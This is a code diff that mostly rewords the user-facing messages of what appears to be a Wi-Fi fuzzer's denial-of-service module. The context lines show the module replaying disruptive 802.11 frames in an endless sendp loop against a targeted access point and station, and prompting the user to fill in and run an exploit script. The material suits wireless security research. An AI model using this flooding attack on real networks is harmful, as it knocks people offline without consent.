@@ -55,14 +55,14 @@ def print_exploit(frame):
     print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
     subtype = int(int.from_bytes(frame[8:9], "big") / 16)
     print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
-    print('Also make the replacements:')
+    print('Also do the replacements:')
     if subtype in {0, 2, 4, 11}:
         print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_STA, ' + bcolors.OKBLUE + '{AP_MAC}' + bcolors.ENDC + ' = targeted_AP')
     elif subtype in {1, 3, 5, 8}:
         print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP, ' + bcolors.OKBLUE + '{AP_MAC}' + bcolors.ENDC + ' = targeted_AP')
-    print('Finally replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your attacking interface')
+    print('Finally, replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your WNIC attacking interface')
     print(f'After the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit.py{bcolors.ENDC}\n')
-    print(bcolors.OKGREEN + "\n----Use it cautiously----\n" + bcolors.ENDC)
+    print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
     input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
     subprocess.call(['clear'], shell=True)
     
@@ -71,7 +71,7 @@ def send_frames(frames_list, mode):
     counter = 0
     if mode == 1:
         try:
-            num_of_frames = int(input('\nType the number of frames to send per seed: '))
+            num_of_frames = int(input('\nType the number of frames to transmit per seed: '))
         except:
             print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
             os._exit(0)
@@ -92,12 +92,12 @@ def send_frames(frames_list, mode):
                     settings.conn_loss = False      
                     break
             counter += 1        
-        print('\n' + bcolors.FAIL + 'No more seeds found in the log files of the fuzzer' + bcolors.ENDC)
+        print('\n' + bcolors.FAIL + 'No more seeds found in the fuzzer’s log files' + bcolors.ENDC)
         print('Exiting attack!!')
         os._exit(0)
     elif mode == 2:
         print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
-        print(bcolors.OKGREEN + "Executing the attack...." + bcolors.ENDC)
+        print(bcolors.OKGREEN + "Launching the attack...." + bcolors.ENDC)
         print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
         print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
         while True:
@@ -105,7 +105,7 @@ def send_frames(frames_list, mode):
                 sendp(frame, count=1, iface=att_interface, verbose=0)
     elif mode == 3:
         print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
-        print(bcolors.OKGREEN + "Executing the attack...." + bcolors.ENDC)
+        print(bcolors.OKGREEN + "Launching the attack...." + bcolors.ENDC)
         print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
         print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
         while True:
@@ -118,13 +118,13 @@ def send_frames(frames_list, mode):
 
 print(dos_attack)
 print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
-print('\t\tThis module launches a DoS attack based on the data collected from the fuzzing process.\n\t\tIt can only be exploited against the same AP and STA that were used it the fuzzing procedure.\n\t\tFrames that caused any kind of problematic behaviour during the fuzzing are being transmited\n\t\tendlessly during the DoS attack.\n\n')
+print('\t\tThis module launches a DoS attack based on the data (log files) collected from the fuzzing process.\n\t\tIt can only be performed against the same AP and STA used during the fuzzing process.\n\t\t Namely, the frames that caused any kind of problematic behavior during the fuzzing are being transmitted\n\t\tare transmitted in an endless loop.\n\n')
 print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
-print('1) Frames detected at the moment of connectivity disruption, one-by-one')
-print('2) Sequence of frames till the moment of the dirsuption detection ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC)
-print('3) Frames detected at the moment of connectivity disruption ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC + '\n\n')
+print('1) Frames detected at the moment of STA connectivity disruption, one-by-one')
+print('2) Sequence of frames till the moment a disruption was detected ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC)
+print('3) Frames detected at the moment of STA connectivity disruption ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC + '\n\n')
 try:
-    choice = int(input('Pick the frames you want to attack with: '))
+    choice = int(input('Select the type of frames you wish to attack with: '))
 except:
     print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
     os._exit(0)
